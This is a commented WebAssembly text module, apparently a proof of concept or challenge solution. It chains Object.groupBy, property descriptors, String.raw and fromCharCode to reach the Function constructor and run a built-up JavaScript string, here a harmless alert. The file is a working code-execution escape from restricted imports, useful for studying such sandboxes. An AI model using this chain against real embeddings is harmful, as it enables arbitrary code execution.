;; (Compile using `wasm-as -all`. Requires a newish version of Binaryen)
(module
  ;; Static methods in the Object constructor, which we can call directly
  (import "constructor" "keys" (func $keys (param externref)(result externref)))
  (import "constructor" "values" (func $values (param externref) (result externref)))
  (import "constructor" "getOwnPropertyNames" (func $getOwnPropertyNames (param externref) (result externref)))
  (import "constructor" "getOwnPropertyDescriptor" (func $getOwnPropertyDescriptor (param externref) (param externref) (result externref)))
  (import "constructor" "getOwnPropertyDescriptors" (func $getOwnPropertyDescriptors (param externref) (result externref)))
  (import "constructor" "getPrototypeOf" (func $getPrototypeOf (param externref) (result externref)))
  (import "constructor" "constructor" (func $constructor (param externref) (result externref)))
  (import "constructor" "assign" (func $assign (param externref) (param externref)))

  ;; Two variants of groupBy: with a WASM or JS function as callback, resp.
  (import "constructor" "groupBy" (func $groupBy_i (param externref) (param funcref) (result externref)))
  (import "constructor" "groupBy" (func $groupBy_e (param externref) (param externref) (result externref)))

  ;; We just use this as an object so import as 'global'
  (import "constructor" "prototype" (global $prototype externref))

  ;; Offsets of specific keys within certain objects.
  ;; The exact indices are determined later and written here, for now just initialize to zero.
  (global $OFF_CONSTRUCTOR (mut i32) (i32.const 0)) ;; 'constructor' in Object prototype
  (global $OFF_VALUE (mut i32) (i32.const 0)) ;; 'value' in descriptor objects
  (global $OFF_FROMCHARCODE (mut i32) (i32.const 0)) ;; 'fromCharcode' in String constructor
  (global $OFF_RAW (mut i32) (i32.const 0)) ;; 'raw' in String constructor

  ;; Obtained strings
  (global $s_length (mut externref) (ref.null extern))
  (global $s_constructor (mut externref) (ref.null extern))
  (global $s_fromCharCode (mut externref) (ref.null extern))
  (global $s_raw (mut externref) (ref.null extern))

  ;; Obtained functions
  (global $String_constructor (mut externref) (ref.null extern))
  (global $String_constructor_raw (mut externref) (ref.null extern))
  (global $String_constructor_fromCharCode(mut externref)(ref.null extern))

  ;; The reference index for the callbacks below (input)
  (global $g_n (mut i32) (i32.const 0))

  ;; The extracted (saved) element, used by the callbacks below (output)
  (global $g_nth_element (mut externref) (ref.null extern))
  (global $g_nth_element_i (mut i32) (i32.const 0))

  ;; Callback to be used with Object.groupBy() to extract an element.
  ;; Object.groupBy() invokes callback(elem, idx) for every element in the array.
  (func $save_nth_element (param $val externref) (param $n i32)
    (local.get $n)
    (global.get $g_n)
    i32.eq
    (if
      (then
        (local.get $val)
        (global.set $g_nth_element)
      )
    )
  )

  ;; Same as above but saves an i32 instead of externref
  (func $save_nth_element_i (param $val i32) (param $n i32)
    (local.get $n)
    (global.get $g_n)
    i32.eq
    (if
      (then
        (local.get $val)
        (global.set $g_nth_element_i)
      )
    )
  )

  ;; Helper around the groupBy trick to access arr[n]
  (func $array_get_nth_element (param $arr externref) (param $n i32) (result externref)
    (local.get $n)
    (global.set $g_n)
    (call $groupBy_i (local.get $arr) (ref.func $save_nth_element))
    drop
    (global.get $g_nth_element)
  )

  ;; Same as $array_get_nth_element but result is i32
  ;; This is useful if we want to do something with the result in WASM land
  ;; (e.g. compare it to another integer)
  (func $array_get_nth_element_i (param $arr externref) (param $n i32) (result i32)
    (local.get $n)
    (global.set $g_n)
    (call $groupBy_i (local.get $arr) (ref.func $save_nth_element_i))
    drop
    (global.get $g_nth_element_i)
  )

  ;; Helper to obtain the n-th property (usually a method) of an object
  ;; NOTE: this order is JS-engine specific, hence we figure out offset dynamically later
  ;; NOTE2: you'd think we can call Object.values() instead (and not need 'value'), but it only lists enumerable properties. In our case, we would like to access any property.
  (func $object_get_nth_property (param $obj externref) (param $n i32) (result externref)
    (local $descriptor_vals externref) ;; for readability

    (call $values (call $getOwnPropertyDescriptors (local.get $obj)))
    (local.set $descriptor_vals)

    (call $values 
      (call $array_get_nth_element
        (local.get $descriptor_vals)
        (local.get $n)
      )
    )
    (global.get $OFF_VALUE)
    (call $array_get_nth_element)
  )

  (func $object_get_named_property (param $obj externref) (param $key externref) (result externref)
    (call $getOwnPropertyDescriptor (local.get $obj) (local.get $key))
    call $values
    (global.get $OFF_VALUE)
    call $array_get_nth_element
  )


  ;; Callbacks that return a fixed (but configurable) value, i.e. ()=>42
  ;; We need versions with JS objects and with an int. These are used together with Object.groupBy() to be able to set an arbitrary key on the resulting object.
  (global $g_val_e (mut externref) (ref.null extern))
  (func $return_val_e (result externref)
    (global.get $g_val_e)
  )
  (global $g_val_i (mut i32) (i32.const 0))
  (func $return_val_i (result i32)
    (global.get $g_val_i)
  )

  ;; Callback that returns a static (incrementing) value each time. Used by $add_value_to_obj.
  (global $g_key_ctr (mut i32) (i32.const 0))
  (func $return_incr_ctr (result i32)
    (global.get $g_key_ctr)
    (i32.const 1)
    i32.add ;; increment
    (global.set $g_key_ctr)
    (global.get $g_key_ctr) ;; return
  )

  ;; Adds $value to obj, under a new unique (incrementing) key.
  ;; This is so we can accumulate values with unique incrementing keys on an object, used to build an array later.
  (func $add_value_to_obj (param $obj externref) (param $value externref)
    (local $tmp externref)

    ;; Create a new object ($tmp) which has just a single property with a controlled value ($value) and a unique key (the return value of the callback tells Object.groupBy what property name to use)
    (call $groupBy_i (local.get $value) (ref.func $return_incr_ctr))
    (local.set $tmp)

    ;; Use Object.assign() to add the property to $obj
    (call $assign (local.get $obj) (local.get $tmp))
  )

  ;; A convoluted way to call fromCharCode on a single number.
  (func $chr (param $c i32) (result externref)
    (local $tmp externref)

    ;; This is just a way to get an array with one element, so groupBy invokes the callback just once.
    (call $getOwnPropertyNames (call $values (global.get $prototype)))
    (local.set $tmp) ;; [ 'length' ]

    ;; First we call Object.groupBy() on a single-element array, with a callback that returns a fixed value ($c), to create an object with just that key. For example, for 65 we'd obtain { "65": ["length"] }
    (local.get $c)
    (global.set $g_val_i)
    (call $groupBy_i (local.get $tmp) (ref.func $return_val_i))

    ;; Then, we call Object.fromCharCode on it by passing e.g. [ "65" ] to Object.groupBy(). (Object.keys will wrap it in an array for us)
    (call $groupBy_e
      (call $keys)
      (global.get $String_constructor_fromCharCode)
    )

    ;; Now Object.keys() gives ['A\x00'], so we do _[0][0] to get just 'A'
    (call $keys)
    (i32.const 0)
    (call $array_get_nth_element)
    (i32.const 0)
    (call $array_get_nth_element)
  )

  ;; Basically adds String.fromCharCode($c) as a new value with unique key to $obj, allowing us to accumulate characters to convert to a string later.
  ;; We use Object.groupBy under the hood, which wraps values in lists. So we're constructing something like [['f'],['o'],['o']].
  ;; Luckily this doesn't matter later on because the String.raw behavior.
  (func $add_charcode_to_obj (param $obj externref) (param $c i32)
    (call $add_value_to_obj
      (local.get $obj)
      (call $chr (local.get $c))
    )
  )

  ;; Turns a list such as [["a"],["b"],["c"],["d"]] into ["a0bcd"]
  ;; (yes, the "0" is added after the first character, due to how we use Object.groupBy)
  ;; (yes, it returns an array, but this is fine as the implicit .toString gives the string)
  (func $list_to_string (param $list externref) (result externref)
    (local $arrwithobj externref)
    (local $innerobj externref)
    (local $res externref)

    ;; Create an object with the key "raw", with as value our input list because String.raw uses this key to build the string.
    ;; (groupBy wraps grouped elements in a list, but they all group to the same key so it gives back the original list)
    (global.get $s_raw)
    (global.set $g_val_e)
    (call $groupBy_i (local.get $list) (ref.func $return_val_e))
    (local.set $res)

    ;; This is just a way to get an array with a single object. We need this as we want to give the object as a parameter to String.raw(), but it needs to be wrapped in an array for the Object.groupBy trick.
    (call $values (call $getOwnPropertyDescriptors (local.get $res)))
    (local.set $arrwithobj)

    ;; Grab the inner object, for the purpose of modifying it
    (call $array_get_nth_element (local.get $arrwithobj) (i32.const 0))
    (local.set $innerobj)

    ;; Merge 'res' into it (our object with the raw key)
    (call $assign (local.get $innerobj) (local.get $res))

    ;; Now we can invoke String.raw via Object.groupBy
    (call $groupBy_e
      (local.get $arrwithobj) (global.get $String_constructor_raw)
    )

    ;; The result is in the key of the returned object, so extract that
    (call $keys)
  )

  ;; Globals used by $array_index_of and $save_idx_if_length_equals
  (global $g_wanted_elem (mut i32) (i32.const 999))
  (global $g_wanted_length (mut i32) (i32.const 0))
  (global $g_obtained_idx (mut i32) (i32.const 999))

  ;; Callback to be used with func $array_index_of
  (func $save_idx_if_equals (param $elem i32) (param $idx i32)
    (local.get $elem)
    (global.get $g_wanted_elem)
    i32.eq
    ;; if($elem == $g_wanted_elem) $g_obtained_idx = idx;
    (if
      (then
        (local.get $idx)
        (global.set $g_obtained_idx)
      )
    )
  )

  ;; Callback to be used with func $get_index_for_element_with_length
  (func $save_idx_if_length_equals (param $elem externref) (param $idx i32)
    ;; Get the descriptor of the 'length' prop, then get its 'value'
    (call $array_get_nth_element_i
      (call $values
        (call $getOwnPropertyDescriptor
          (local.get $elem) (global.get $s_length)
        )
      )
      (global.get $OFF_VALUE) ;; The index of 'value' in prop descriptors
    )

    ;; if(len == $g_wanted_length) $g_obtained_idx = idx;
    (global.get $g_wanted_length)
    i32.eq
    (if
      (then
        (local.get $idx)
        (global.set $g_obtained_idx)
      )
    )
  )

  ;; Get the index of the $needle in $arr. Used later to obtain OFF_VALUE (in property descriptor)
  (func $array_index_of (param $arr externref) (param $needle i32) (result i32)
    (local.get $needle)
    (global.set $g_wanted_elem)

    (call $groupBy_i
      (local.get $arr)
      (ref.func $save_idx_if_equals)
    )
    drop

    (global.get $g_obtained_idx)
  )


  ;; The order of properties in built-in objects is implementation-specific.
  ;; Luckily, we can find out the indices of some props we need, by their unique name lengths.
  (func $get_index_for_element_with_length (param $arr externref) (param $wanted_length i32) (result i32)
    ;; Object.groupBy($arr, $save_idx_if_length_equals)
    (local.get $wanted_length)
    (global.set $g_wanted_length)

    (call $groupBy_i
      (local.get $arr)
      (ref.func $save_idx_if_length_equals)
    )
    drop

    (global.get $g_obtained_idx)
  )

  ;; Build the payload
  (func $build_string (result externref)
    (local $accum externref)

    ;; accum = {}
    ;; There are probably cleaner ways but we just make a Function("B"). This is a clean object that has no own keys (which is what we need)
    (call $constructor (call $chr (i32.const 0x42)))
    (local.set $accum)

    ;; Start with "0;" because a "0" is injected at index 1 (due to String.raw also receiving the second argument which Object.groupBy passes to its callback (idx))
    ;; The final result is "00;alert('hi from WASM')"
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x30))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x3b))

    ;; alert('
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x61))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6c))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x65))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x72))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x74))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x28))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x27))

    ;; hi from WASM
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x68))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x69))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x20))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x66))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x72))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6f))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6d))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x20))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x57))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x41))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x53))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x4d))

    ;; ')
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x27))
    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x29))


    ;; Convert into list
    (call $values (local.get $accum))
    (call $list_to_string)
  )

  (func $main
    (local $payload externref)

    ;; Obtain the string 'length'
    ;; Luckily it is the only own property of an empty array, hence index 0
    (call $array_get_nth_element
      (call $getOwnPropertyNames (call $values (global.get $prototype)))
      (i32.const 0)
    )
    (global.set $s_length)

    ;; Obtain the offset of 'value' in property descriptors. We can't use $get_index_for_element_with_length here, as it uses 'value' internally.
    ;; Instead, we take a look which of the properties of a property descriptor of 'length' has the value 6, e.g.:
    ;;    Object.values(Object.getOwnPropertyDescriptor('length', 'length'));
    ;; gives: [ 6, false, false, false ]
    ;; The one at index (0 in the example) is the length, so store that index for future use.
    (call $array_index_of
      (call $values
        (call $getOwnPropertyDescriptor
          (global.get $s_length)
          (global.get $s_length)
        )
      )
      (i32.const 6)
    )
    (global.set $OFF_VALUE)

    ;; Obtain the offset of 'constructor' in the Object prototype
    (call $get_index_for_element_with_length
      ;; Object.getOwnPropertyNames({}.constructor.prototype)
      (call $getOwnPropertyNames (global.get $prototype))
      (i32.const 11) ;; "constructor".length
    )
    (global.set $OFF_CONSTRUCTOR)

    ;; Get the string 'constructor'
    ;; In addition to the offset obtained above, we need this as a string because the index of 'constructor' in Object's property list is different from the index of 'constructor' in String's property list.
    (call $array_get_nth_element
      (call $getOwnPropertyNames (global.get $prototype))
      (global.get $OFF_CONSTRUCTOR)
    )
    (global.set $s_constructor)

    ;; Get String.prototype.constructor (via the string "constructor" but could be any string)
    (call $object_get_named_property
      (call $getPrototypeOf (global.get $s_constructor))
      (global.get $s_constructor)
    )
    (global.set $String_constructor)

    ;; Obtain the idxs of 'fromCharCode' and 'raw' in list of String's keys
    (call $get_index_for_element_with_length
      ;; Object.getOwnPropertyNames(String)
      (call $getOwnPropertyNames (global.get $String_constructor))
      (i32.const 12) ;; "fromCharCode".length
    )
    (global.set $OFF_FROMCHARCODE)
    (call $get_index_for_element_with_length
      ;; Object.getOwnPropertyNames(String)
      (call $getOwnPropertyNames (global.get $String_constructor))
      (i32.const 3) ;; "raw".length
    )
    (global.set $OFF_RAW)

    ;; Get String.constructor.fromCharCode and String.constructor.raw
    (call $object_get_nth_property
      (global.get $String_constructor) (global.get $OFF_FROMCHARCODE)
    )
    (global.set $String_constructor_fromCharCode)
    (call $object_get_nth_property
      (global.get $String_constructor) (global.get $OFF_RAW)
    )
    (global.set $String_constructor_raw)

    ;; Get the string 'raw' from the String constructor (we also need it to construct the parameter of String.raw)
    (call $array_get_nth_element
      (call $getOwnPropertyNames (global.get $String_constructor))
      (global.get $OFF_RAW)
    )
    (global.set $s_raw)

    ;; Build the payload. Returns wrapped in array, e.g. [ "00;alert('hi from WASM')" ]
    (call $build_string)
    (local.set $payload)

    ;; Make our function and call it using groupBy!
    (call $groupBy_e
      ;; Use payload as a convenient array with length 1 to use for groupBy
      (local.get $payload)
      (call $constructor
        (local.get $payload)
      )
    )
    drop ;; ignore return value
  )
  (start $main)
)
